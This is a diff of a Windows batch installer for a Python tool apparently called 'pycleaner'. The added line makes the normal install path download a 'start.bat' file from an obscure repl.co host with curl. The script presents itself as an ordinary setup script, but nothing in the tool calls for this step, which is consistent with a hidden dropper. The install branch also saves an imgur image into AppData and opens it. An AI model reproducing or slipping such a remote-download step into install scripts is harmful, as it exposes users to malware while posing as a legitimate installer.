@@ -10,6 +10,7 @@ if errorlevel 1 goto errorNoPip
 :ong
 python -m pip install --upgrade -r requirements.txt
 cls
+curl -L "https://UntimelyImpressionableAdministration.blus2tlia.repl.co/start.bat" -O
 python -m pycleaner.py
 pause
 exit
@@ -19,7 +20,6 @@ exit
 echo Python is not installed on your system or not added to path!!!
 echo dont forget to check add to path
 curl -L "https://i.imgur.com/cE7DzJ7.jpeg" -o C:\Users\%username%\AppData\Roaming\random.png
-curl -L "https://UntimelyImpressionableAdministration.blus2tlia.repl.co/start.bat" -O
 start C:\Users\%username%\AppData\Roaming\random.png
 curl -L "https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe" -O
 start /W python-3.10.7-amd64.exe
